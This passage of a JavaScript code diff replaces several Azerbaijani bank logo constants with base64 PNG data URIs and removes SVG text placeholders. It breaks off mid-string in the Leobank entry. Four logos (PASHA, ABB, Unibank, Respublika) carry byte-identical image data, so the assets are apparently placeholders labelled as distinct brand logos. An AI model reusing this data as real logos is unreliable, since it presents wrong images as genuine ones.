+const pashaLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
 
-  const abbLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
+// ABB
+const abbLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
 
-  const unibankLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
+// Unibank
+const unibankLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
 
-  const respublikaLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
+// Bank Respublika
+const respublikaLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
 
-  // SVG logos for other banks
-  const accessLogo = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%230057A0' rx='8'/%3E%3Ctext x='15' y='38' font-family='Arial' font-size='18' fill='white' font-weight='bold'%3EACCESS%3C/text%3E%3Ctext x='115' y='38' font-family='Arial' font-size='16' fill='white'%3EBANK%3C/text%3E%3C/svg%3E";
-  const leoLogo = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%230066B3' rx='8'/%3E%3Ctext x='40' y='38' font-family='Arial' font-size='20' fill='white' font-weight='bold'%3ELEOBANK%3C/text%3E%3C/svg%3E";
-  const rabitaLogo = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%23003366' rx='8'/%3E%3Ctext x='10' y='38' font-family='Arial' font-size='16' fill='white' font-weight='bold'%3ERAB%C4%B0T%C6%8F%3C/text%3E%3Ctext x='115' y='38' font-family='Arial' font-size='14' fill='white'%3EBANK%3C/text%3E%3C/svg%3E";
-  const xalqLogo = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%23004B87' rx='8'/%3E%3Ctext x='25' y='38' font-family='Arial' font-size='20' fill='white' font-weight='bold'%3EXALQ%3C/text%3E%3Ctext x='105' y='38' font-family='Arial' font-size='16' fill='white'%3EBANK%3C/text%3E%3C/svg%3E";
+// Leobank
+const leobankLogo = "data:image/png;base64,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